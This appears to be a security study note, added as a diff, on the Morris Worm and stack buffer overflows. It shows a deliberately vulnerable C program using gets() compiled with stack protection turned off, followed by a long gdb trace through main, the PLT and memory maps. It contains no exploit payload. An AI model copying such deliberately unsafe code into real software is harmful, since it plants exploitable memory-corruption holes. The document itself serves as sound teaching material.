@@ -1,0 +1,1658 @@
+
+
+
+1. Buffer Overflow
+
+1) Nov. 2, 1988
+
+The first computer worm (called Morris Worm) was born.
+
+Robert Tappan Morris
+Creator of the worm
+Cornell graduate
+Tenured professor at MIT now
+
+http://www.nndb.com/people/466/000027385/
+
+
+2) Morris Worm
+Exploited a buffer overflow vulnerability in fingerd
+
+ex)
+int main(int argc, char *argv[])
+{
+	char line[512];
+	/* ... omitted */
+	gets(line);		<= buffer overflow - This single line allowed the Morris Worm to infect 10% of the Internet computers in 1988
+	/* ... omitted */
+}
+
+3) Historic Exploitation
+
+ex)
+/*
+ * gcc -o morris_worm_ex morris_worm_ex.c -m32 -mpreferred-stack-boundary=2 -O0 -fno-stack-protector
+ */
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+        char line[512];
+        gets(line);
+        return 0;
+}
+
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ gcc -o morris_worm_ex morris_worm_ex.c -m32 -mpreferred-stack-boundary=2 -O0 -fno-stack-protector
+
+morris_worm_ex.c: In function ‘main’:
+morris_worm_ex.c:9:2: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
+  gets(line);
+  ^
+/tmp/ccgXUHQC.o: In function `main':
+morris_worm_ex.c:(.text+0x11): warning: the `gets' function is dangerous and should not be used.
+
+=> This compile warning can be ignored because this is just example for buffer overflow.
+
+* gets(char *s)
+Reads a line from STDIN into the buffer pointed to by s until a terminating newline or EOF, which it replaces with a NULL byte ('\0')
+
+
+
+
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ gdb -q ./morris_worm_ex
+Reading symbols from ./morris_worm_ex...(no debugging symbols found)...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb)
+
+
+
+
+
+
+guybrush@nt900x5t:~/Project/github/hack/binhacks/buffer_overflow$ gdb -q ./morris_worm_ex
+Reading symbols from ./morris_worm_ex...(no debugging symbols found)...done.
+(gdb) b *main+0
+Breakpoint 1 at 0x804840b
+(gdb) r
+Starting program: /home/guybrush/Project/github/hack/binhacks/buffer_overflow/morris_worm_ex 
+
+Breakpoint 1, 0x0804840b in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+=> 0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xf7fb6dbc	-134517316
+ecx            0xa09fa08d	-1600151411
+edx            0xffffce04	-12796
+ebx            0x0	0
+esp            0xffffcddc	0xffffcddc
+ebp            0x0	0x0
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x804840b	0x804840b <main>
+eflags         0x292	[ AF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/x $esp
+0xffffcddc:	0xf7e1d637
+(gdb) x/10i 0xf7e1d637
+   0xf7e1d637 <__libc_start_main+247>:	add    esp,0x10
+   0xf7e1d63a <__libc_start_main+250>:	sub    esp,0xc
+   0xf7e1d63d <__libc_start_main+253>:	push   eax
+   0xf7e1d63e <__libc_start_main+254>:	call   0xf7e337b0 <exit>
+   0xf7e1d643 <__libc_start_main+259>:	xor    ecx,ecx
+   0xf7e1d645 <__libc_start_main+261>:	jmp    0xf7e1d572 <__libc_start_main+50>
+   0xf7e1d64a <__libc_start_main+266>:	mov    esi,DWORD PTR [esp+0x8]
+   0xf7e1d64e <__libc_start_main+270>:	mov    eax,DWORD PTR [esi+0x3868]
+   0xf7e1d654 <__libc_start_main+276>:	ror    eax,0x9
+   0xf7e1d657 <__libc_start_main+279>:	xor    eax,DWORD PTR gs:0x18
+(gdb) si
+0x0804840c in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+=> 0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xf7fb6dbc	-134517316
+ecx            0xa09fa08d	-1600151411
+edx            0xffffce04	-12796
+ebx            0x0	0
+esp            0xffffcdd8	0xffffcdd8
+ebp            0x0	0x0
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x804840c	0x804840c <main+1>
+eflags         0x292	[ AF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/x $esp
+0xffffcdd8:	0x00000000
+(gdb) si
+0x0804840e in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+=> 0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xf7fb6dbc	-134517316
+ecx            0xa09fa08d	-1600151411
+edx            0xffffce04	-12796
+ebx            0x0	0
+esp            0xffffcdd8	0xffffcdd8
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x804840e	0x804840e <main+3>
+eflags         0x292	[ AF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) si
+0x08048414 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+=> 0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xf7fb6dbc	-134517316
+ecx            0xa09fa08d	-1600151411
+edx            0xffffce04	-12796
+ebx            0x0	0
+esp            0xffffcbd8	0xffffcbd8
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048414	0x8048414 <main+9>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/x 0xffffcdb8
+0xffffcdb8:	0xffffce7c
+(gdb) x/x 0xffffcbd8
+0xffffcbd8:	0xf7ffd53c
+(gdb) si
+0x0804841a in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+=> 0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xffffcbd8	-13352
+ecx            0xa09fa08d	-1600151411
+edx            0xffffce04	-12796
+ebx            0x0	0
+esp            0xffffcbd8	0xffffcbd8
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x804841a	0x804841a <main+15>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/x $esp
+0xffffcbd8:	0xf7ffd53c
+(gdb) x/x $eax
+0xffffcbd8:	0xf7ffd53c
+(gdb) si
+0x0804841b in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+=> 0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xffffcbd8	-13352
+ecx            0xa09fa08d	-1600151411
+edx            0xffffce04	-12796
+ebx            0x0	0
+esp            0xffffcbd4	0xffffcbd4
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x804841b	0x804841b <main+16>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) x/x $esp
+0xffffcbd4:	0xffffcbd8
+(gdb) si
+0x080482e0 in gets@plt ()
+(gdb) disassemble 
+Dump of assembler code for function gets@plt:
+=> 0x080482e0 <+0>:	jmp    DWORD PTR ds:0x804a00c
+   0x080482e6 <+6>:	push   0x0
+   0x080482eb <+11>:	jmp    0x80482d0
+End of assembler dump.
+(gdb) x/x 0x0804a00c
+0x804a00c:	0x080482e6
+(gdb) si
+0x080482e6 in gets@plt ()
+(gdb) disassemble 
+Dump of assembler code for function gets@plt:
+   0x080482e0 <+0>:	jmp    DWORD PTR ds:0x804a00c
+=> 0x080482e6 <+6>:	push   0x0
+   0x080482eb <+11>:	jmp    0x80482d0
+End of assembler dump.
+(gdb) si
+0x080482eb in gets@plt ()
+(gdb) disassemble 
+Dump of assembler code for function gets@plt:
+   0x080482e0 <+0>:	jmp    DWORD PTR ds:0x804a00c
+   0x080482e6 <+6>:	push   0x0
+=> 0x080482eb <+11>:	jmp    0x80482d0
+End of assembler dump.
+(gdb) x/x 0x080482d0
+0x80482d0:	0xa00435ff
+(gdb) x/x 0xa00435ff
+0xa00435ff:	Cannot access memory at address 0xa00435ff
+(gdb) x/10i 0xa00435ff
+   0xa00435ff:	Cannot access memory at address 0xa00435ff
+(gdb) x/10i 0x080482d0
+   0x80482d0:	push   DWORD PTR ds:0x804a004
+   0x80482d6:	jmp    DWORD PTR ds:0x804a008
+   0x80482dc:	add    BYTE PTR [eax],al
+   0x80482de:	add    BYTE PTR [eax],al
+   0x80482e0 <gets@plt>:	jmp    DWORD PTR ds:0x804a00c
+   0x80482e6 <gets@plt+6>:	push   0x0
+=> 0x80482eb <gets@plt+11>:	jmp    0x80482d0
+   0x80482f0 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804a010
+   0x80482f6 <__libc_start_main@plt+6>:	push   0x8
+   0x80482fb <__libc_start_main@plt+11>:	jmp    0x80482d0
+(gdb) x/20i 0x080482d0
+   0x80482d0:	push   DWORD PTR ds:0x804a004
+   0x80482d6:	jmp    DWORD PTR ds:0x804a008
+   0x80482dc:	add    BYTE PTR [eax],al
+   0x80482de:	add    BYTE PTR [eax],al
+   0x80482e0 <gets@plt>:	jmp    DWORD PTR ds:0x804a00c
+   0x80482e6 <gets@plt+6>:	push   0x0
+=> 0x80482eb <gets@plt+11>:	jmp    0x80482d0
+   0x80482f0 <__libc_start_main@plt>:	jmp    DWORD PTR ds:0x804a010
+   0x80482f6 <__libc_start_main@plt+6>:	push   0x8
+   0x80482fb <__libc_start_main@plt+11>:	jmp    0x80482d0
+   0x8048300:	jmp    DWORD PTR ds:0x8049ffc
+   0x8048306:	xchg   ax,ax
+   0x8048308:	add    BYTE PTR [eax],al
+   0x804830a:	add    BYTE PTR [eax],al
+   0x804830c:	add    BYTE PTR [eax],al
+   0x804830e:	add    BYTE PTR [eax],al
+   0x8048310 <_start>:	xor    ebp,ebp
+   0x8048312 <_start+2>:	pop    esi
+   0x8048313 <_start+3>:	mov    ecx,esp
+   0x8048315 <_start+5>:	and    esp,0xfffffff0
+(gdb) si
+0x080482d0 in ?? ()
+(gdb) disassemble 
+No function contains program counter for selected frame.
+(gdb) finish
+Run till exit from #0  0x080482d0 in ?? ()
+
+0x08048420 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+=> 0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) x/x 0x080482d0
+0x80482d0:	0xa00435ff
+(gdb) x/x 0x0804a00c
+0x804a00c:	0xf7e63890
+(gdb) x/10i 0xf7e63890
+   0xf7e63890 <gets>:	push   ebp
+   0xf7e63891 <gets+1>:	mov    ebp,esp
+   0xf7e63893 <gets+3>:	push   edi
+   0xf7e63894 <gets+4>:	push   esi
+   0xf7e63895 <gets+5>:	push   ebx
+   0xf7e63896 <gets+6>:	call   0xf7f22285
+   0xf7e6389b <gets+11>:	add    ebx,0x151765
+   0xf7e638a1 <gets+17>:	sub    esp,0x1c
+   0xf7e638a4 <gets+20>:	mov    eax,DWORD PTR [ebp+0x8]
+   0xf7e638a7 <gets+23>:	mov    esi,DWORD PTR [ebx+0xe00]
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+=> 0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xffffcbd8	-13352
+ecx            0x1	1
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcbd4	0xffffcbd4
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048420	0x8048420 <main+21>
+eflags         0x246	[ PF ZF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) si
+0x08048423 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+=> 0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0xffffcbd8	-13352
+ecx            0x1	1
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcbd8	0xffffcbd8
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048423	0x8048423 <main+24>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) si
+0x08048428 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+=> 0x08048428 <+29>:	leave  
+   0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0x0	0
+ecx            0x1	1
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcbd8	0xffffcbd8
+ebp            0xffffcdd8	0xffffcdd8
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048428	0x8048428 <main+29>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) si
+0x08048429 in main ()
+(gdb) disassemble 
+Dump of assembler code for function main:
+   0x0804840b <+0>:	push   ebp
+   0x0804840c <+1>:	mov    ebp,esp
+   0x0804840e <+3>:	sub    esp,0x200
+   0x08048414 <+9>:	lea    eax,[ebp-0x200]
+   0x0804841a <+15>:	push   eax
+   0x0804841b <+16>:	call   0x80482e0 <gets@plt>
+   0x08048420 <+21>:	add    esp,0x4
+   0x08048423 <+24>:	mov    eax,0x0
+   0x08048428 <+29>:	leave  
+=> 0x08048429 <+30>:	ret    
+End of assembler dump.
+(gdb) i r
+eax            0x0	0
+ecx            0x1	1
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcddc	0xffffcddc
+ebp            0x0	0x0
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0x8048429	0x8048429 <main+30>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) si
+0xf7e1d637 in __libc_start_main () from /lib32/libc.so.6
+(gdb) disassemble 
+Dump of assembler code for function __libc_start_main:
+   0xf7e1d540 <+0>:	call   0xf7f22289
+   0xf7e1d545 <+5>:	add    eax,0x197abb
+   0xf7e1d54a <+10>:	push   ebp
+   0xf7e1d54b <+11>:	push   edi
+   0xf7e1d54c <+12>:	push   esi
+   0xf7e1d54d <+13>:	push   ebx
+   0xf7e1d54e <+14>:	mov    edi,eax
+   0xf7e1d550 <+16>:	sub    esp,0x4c
+   0xf7e1d553 <+19>:	mov    edx,DWORD PTR [edi-0x6c]
+   0xf7e1d559 <+25>:	mov    DWORD PTR [esp+0x8],eax
+   0xf7e1d55d <+29>:	mov    eax,DWORD PTR [esp+0x74]
+   0xf7e1d561 <+33>:	test   edx,edx
+   0xf7e1d563 <+35>:	je     0xf7e1d643 <__libc_start_main+259>
+   0xf7e1d569 <+41>:	mov    ebx,DWORD PTR [edx]
+   0xf7e1d56b <+43>:	xor    ecx,ecx
+   0xf7e1d56d <+45>:	test   ebx,ebx
+   0xf7e1d56f <+47>:	sete   cl
+   0xf7e1d572 <+50>:	mov    esi,DWORD PTR [esp+0x8]
+   0xf7e1d576 <+54>:	test   eax,eax
+   0xf7e1d578 <+56>:	lea    edx,[esi+0x40]
+   0xf7e1d57e <+62>:	mov    DWORD PTR [edx],ecx
+   0xf7e1d580 <+64>:	je     0xf7e1d592 <__libc_start_main+82>
+   0xf7e1d582 <+66>:	sub    esp,0x4
+   0xf7e1d585 <+69>:	push   0x0
+   0xf7e1d587 <+71>:	push   0x0
+   0xf7e1d589 <+73>:	push   eax
+   0xf7e1d58a <+74>:	call   0xf7e339d0 <__cxa_atexit>
+   0xf7e1d58f <+79>:	add    esp,0x10
+   0xf7e1d592 <+82>:	mov    eax,DWORD PTR [esp+0x8]
+   0xf7e1d596 <+86>:	mov    eax,DWORD PTR [eax-0xdc]
+   0xf7e1d59c <+92>:	mov    ebx,DWORD PTR [eax]
+   0xf7e1d59e <+94>:	and    ebx,0x2
+   0xf7e1d5a1 <+97>:	jne    0xf7e1d67e <__libc_start_main+318>
+   0xf7e1d5a7 <+103>:	cmp    DWORD PTR [esp+0x6c],0x0
+   0xf7e1d5ac <+108>:	je     0xf7e1d5ca <__libc_start_main+138>
+   0xf7e1d5ae <+110>:	push   edx
+   0xf7e1d5af <+111>:	mov    eax,DWORD PTR [esp+0xc]
+   0xf7e1d5b3 <+115>:	mov    eax,DWORD PTR [eax-0xb8]
+   0xf7e1d5b9 <+121>:	push   DWORD PTR [eax]
+   0xf7e1d5bb <+123>:	push   DWORD PTR [esp+0x70]
+   0xf7e1d5bf <+127>:	push   DWORD PTR [esp+0x70]
+   0xf7e1d5c3 <+131>:	call   DWORD PTR [esp+0x7c]
+   0xf7e1d5c7 <+135>:	add    esp,0x10
+   0xf7e1d5ca <+138>:	mov    eax,DWORD PTR [esp+0x8]
+   0xf7e1d5ce <+142>:	mov    eax,DWORD PTR [eax-0xdc]
+   0xf7e1d5d4 <+148>:	mov    edx,DWORD PTR [eax+0x20c]
+   0xf7e1d5da <+154>:	test   edx,edx
+   0xf7e1d5dc <+156>:	jne    0xf7e1d6e2 <__libc_start_main+418>
+   0xf7e1d5e2 <+162>:	test   ebx,ebx
+   0xf7e1d5e4 <+164>:	jne    0xf7e1d6bb <__libc_start_main+379>
+   0xf7e1d5ea <+170>:	sub    esp,0xc
+   0xf7e1d5ed <+173>:	lea    eax,[esp+0x20]
+   0xf7e1d5f1 <+177>:	push   eax
+   0xf7e1d5f2 <+178>:	call   0xf7e30ad0 <_setjmp>
+   0xf7e1d5f7 <+183>:	add    esp,0x10
+   0xf7e1d5fa <+186>:	test   eax,eax
+---Type <return> to continue, or q <return> to quit---
+   0xf7e1d5fc <+188>:	jne    0xf7e1d64a <__libc_start_main+266>
+   0xf7e1d5fe <+190>:	mov    eax,gs:0x80
+   0xf7e1d604 <+196>:	mov    DWORD PTR [esp+0x30],eax
+   0xf7e1d608 <+200>:	mov    eax,gs:0x7c
+   0xf7e1d60e <+206>:	mov    DWORD PTR [esp+0x34],eax
+   0xf7e1d612 <+210>:	lea    eax,[esp+0x14]
+   0xf7e1d616 <+214>:	mov    gs:0x80,eax
+   0xf7e1d61c <+220>:	sub    esp,0x4
+   0xf7e1d61f <+223>:	mov    eax,DWORD PTR [esp+0xc]
+   0xf7e1d623 <+227>:	mov    eax,DWORD PTR [eax-0xb8]
+   0xf7e1d629 <+233>:	push   DWORD PTR [eax]
+   0xf7e1d62b <+235>:	push   DWORD PTR [esp+0x70]
+   0xf7e1d62f <+239>:	push   DWORD PTR [esp+0x70]
+   0xf7e1d633 <+243>:	call   DWORD PTR [esp+0x70]
+=> 0xf7e1d637 <+247>:	add    esp,0x10
+   0xf7e1d63a <+250>:	sub    esp,0xc
+   0xf7e1d63d <+253>:	push   eax
+   0xf7e1d63e <+254>:	call   0xf7e337b0 <exit>
+   0xf7e1d643 <+259>:	xor    ecx,ecx
+   0xf7e1d645 <+261>:	jmp    0xf7e1d572 <__libc_start_main+50>
+   0xf7e1d64a <+266>:	mov    esi,DWORD PTR [esp+0x8]
+   0xf7e1d64e <+270>:	mov    eax,DWORD PTR [esi+0x3868]
+   0xf7e1d654 <+276>:	ror    eax,0x9
+   0xf7e1d657 <+279>:	xor    eax,DWORD PTR gs:0x18
+   0xf7e1d65e <+286>:	call   eax
+   0xf7e1d660 <+288>:	mov    eax,DWORD PTR [esi+0x3860]
+   0xf7e1d666 <+294>:	ror    eax,0x9
+   0xf7e1d669 <+297>:	xor    eax,DWORD PTR gs:0x18
+   0xf7e1d670 <+304>:	lock dec DWORD PTR [eax]
+   0xf7e1d673 <+307>:	sete   dl
+   0xf7e1d676 <+310>:	test   dl,dl
+   0xf7e1d678 <+312>:	je     0xf7e1d69f <__libc_start_main+351>
+   0xf7e1d67a <+314>:	xor    eax,eax
+   0xf7e1d67c <+316>:	jmp    0xf7e1d63a <__libc_start_main+250>
+   0xf7e1d67e <+318>:	push   ecx
+   0xf7e1d67f <+319>:	push   ecx
+   0xf7e1d680 <+320>:	mov    ecx,DWORD PTR [esp+0x70]
+   0xf7e1d684 <+324>:	push   DWORD PTR [ecx]
+   0xf7e1d686 <+326>:	mov    ecx,DWORD PTR [esp+0x14]
+   0xf7e1d68a <+330>:	lea    edx,[ecx-0x57729]
+   0xf7e1d690 <+336>:	push   edx
+   0xf7e1d691 <+337>:	call   DWORD PTR [eax+0x1e0]
+   0xf7e1d697 <+343>:	add    esp,0x10
+   0xf7e1d69a <+346>:	jmp    0xf7e1d5a7 <__libc_start_main+103>
+   0xf7e1d69f <+351>:	mov    edx,0x1
+   0xf7e1d6a4 <+356>:	xor    ebx,ebx
+   0xf7e1d6a6 <+358>:	lea    esi,[esi+0x0]
+   0xf7e1d6a9 <+361>:	lea    edi,[edi+eiz*1+0x0]
+   0xf7e1d6b0 <+368>:	mov    eax,edx
+   0xf7e1d6b2 <+370>:	call   DWORD PTR gs:0x10
+   0xf7e1d6b9 <+377>:	jmp    0xf7e1d6b0 <__libc_start_main+368>
+   0xf7e1d6bb <+379>:	push   eax
+   0xf7e1d6bc <+380>:	push   eax
+   0xf7e1d6bd <+381>:	mov    eax,DWORD PTR [esp+0x70]
+   0xf7e1d6c1 <+385>:	push   DWORD PTR [eax]
+   0xf7e1d6c3 <+387>:	mov    ecx,DWORD PTR [esp+0x14]
+   0xf7e1d6c7 <+391>:	lea    eax,[ecx-0x5770f]
+---Type <return> to continue, or q <return> to quit---
+   0xf7e1d6cd <+397>:	push   eax
+   0xf7e1d6ce <+398>:	mov    eax,DWORD PTR [ecx-0xdc]
+   0xf7e1d6d4 <+404>:	call   DWORD PTR [eax+0x1e0]
+   0xf7e1d6da <+410>:	add    esp,0x10
+   0xf7e1d6dd <+413>:	jmp    0xf7e1d5ea <__libc_start_main+170>
+   0xf7e1d6e2 <+418>:	mov    ebp,DWORD PTR [eax+0x208]
+   0xf7e1d6e8 <+424>:	mov    eax,DWORD PTR [esp+0x8]
+   0xf7e1d6ec <+428>:	xor    edi,edi
+   0xf7e1d6ee <+430>:	mov    eax,DWORD PTR [eax-0x118]
+   0xf7e1d6f4 <+436>:	mov    esi,DWORD PTR [eax]
+   0xf7e1d6f6 <+438>:	add    esi,0x25c
+   0xf7e1d6fc <+444>:	mov    eax,DWORD PTR [ebp+0xc]
+   0xf7e1d6ff <+447>:	test   eax,eax
+   0xf7e1d701 <+449>:	je     0xf7e1d714 <__libc_start_main+468>
+   0xf7e1d703 <+451>:	mov    DWORD PTR [esp+0xc],edx
+   0xf7e1d707 <+455>:	sub    esp,0xc
+   0xf7e1d70a <+458>:	push   esi
+   0xf7e1d70b <+459>:	call   eax
+   0xf7e1d70d <+461>:	add    esp,0x10
+   0xf7e1d710 <+464>:	mov    edx,DWORD PTR [esp+0xc]
+   0xf7e1d714 <+468>:	add    edi,0x1
+   0xf7e1d717 <+471>:	add    esi,0x8
+   0xf7e1d71a <+474>:	mov    ebp,DWORD PTR [ebp+0x20]
+   0xf7e1d71d <+477>:	cmp    edx,edi
+   0xf7e1d71f <+479>:	jne    0xf7e1d6fc <__libc_start_main+444>
+   0xf7e1d721 <+481>:	jmp    0xf7e1d5e2 <__libc_start_main+162>
+End of assembler dump.
+(gdb) i r
+eax            0x0	0
+ecx            0x1	1
+edx            0xf7fb687c	-134518660
+ebx            0x0	0
+esp            0xffffcde0	0xffffcde0
+ebp            0x0	0x0
+esi            0xf7fb5000	-134524928
+edi            0xf7fb5000	-134524928
+eip            0xf7e1d637	0xf7e1d637 <__libc_start_main+247>
+eflags         0x286	[ PF SF IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+(gdb) 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+(gdb) shell ps -a
+  PID TTY          TIME CMD
+25758 pts/2    00:00:00 gdb
+25760 pts/2    00:00:00 morris_worm_ex
+26124 pts/2    00:00:00 ps
+(gdb) shell cat /proc/25760/maps
+08048000-08049000 r-xp 00000000 103:07 6817521                           /home/guybrush/Project/github/hack/binhacks/buffer_overflow/morris_worm_ex
+08049000-0804a000 r--p 00000000 103:07 6817521                           /home/guybrush/Project/github/hack/binhacks/buffer_overflow/morris_worm_ex
+0804a000-0804b000 rw-p 00001000 103:07 6817521                           /home/guybrush/Project/github/hack/binhacks/buffer_overflow/morris_worm_ex
+0804b000-0806c000 rw-p 00000000 00:00 0                                  [heap]
+f7e04000-f7e05000 rw-p 00000000 00:00 0 
